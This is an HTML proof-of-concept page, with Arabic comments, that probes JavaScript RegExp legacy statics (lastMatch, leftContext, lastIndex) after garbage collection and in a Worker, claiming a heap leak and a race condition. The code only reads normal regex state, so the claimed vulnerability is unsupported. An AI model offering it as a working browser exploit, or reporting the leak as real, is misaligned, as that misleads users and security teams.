<!DOCTYPE html>
<html>
<body>
<h2>PoC 3: RegExp.lastMatch Heap Leak</h2>
<button onclick="runRegExpLeak()">ابدأ التسريب</button>
<div id="result" style="font-family: monospace; white-space: pre;"></div>

<script>
function log(msg) {
    document.getElementById('result').textContent += msg + '\n';
}

function runRegExpLeak() {
    log('=== RegExp.lastMatch Leak ===\n');
    
    // 1. إنشاء string ضخم يحتوي على marker
    const marker = 'AAAA' + 'B'.repeat(1000) + 'CCCC';
    
    // 2. تشغيل regex يلتقط أجزاء
    const re = /(.{100})/;
    re.exec(marker);
    
    log(`RegExp.$1: ${RegExp.$1}`);
    log(`RegExp.lastMatch: ${RegExp.lastMatch}`);
    log(`RegExp.leftContext length: ${RegExp.leftContext.length}`);
    log(`RegExp.rightContext length: ${RegExp.rightContext.length}`);
    
    // 3. محاولة التلاعب بـ lastIndex
    re.lastIndex = 500000000; // قيمة غير منطقية
    try {
        const result = re.exec('x'.repeat(100));
        log(`After lastIndex manipulation: ${result}`);
    } catch(e) {
        log(`Error: ${e.message}`);
    }
    
    // 4. اختبار مع string مُحرر
    let bigStr = 'X'.repeat(1024 * 1024); // 1MB
    const re2 = /(X{100})/g;
    re2.exec(bigStr);
    
    // تحرير الـ string
    bigStr = null;
    if (typeof gc !== 'undefined') gc();
    
    // محاولة الوصول بعد التحرير
    log(`\nAfter GC:`);
    log(`RegExp.lastMatch: ${RegExp.lastMatch}`);
    
    // 5. استغلال race condition مع Worker
    log('\n=== Worker Race Condition ===');
    const workerCode = `
        self.onmessage = function(e) {
            const re = /(.+)/;
            re.exec(e.data);
            self.postMessage({
                lastMatch: RegExp.lastMatch,
                leftContext: RegExp.leftContext,
                rightContext: RegExp.rightContext
            });
        };
    `;
    
    const blob = new Blob([workerCode], {type: 'application/javascript'});
    const worker = new Worker(URL.createObjectURL(blob));
    
    worker.onmessage = function(e) {
        log('Worker result: ' + JSON.stringify(e.data));
    };
    
    worker.postMessage('A'.repeat(10000));
    
    log('\n=== انتهى PoC 3 ===');
}
</script>
</body>
</html>
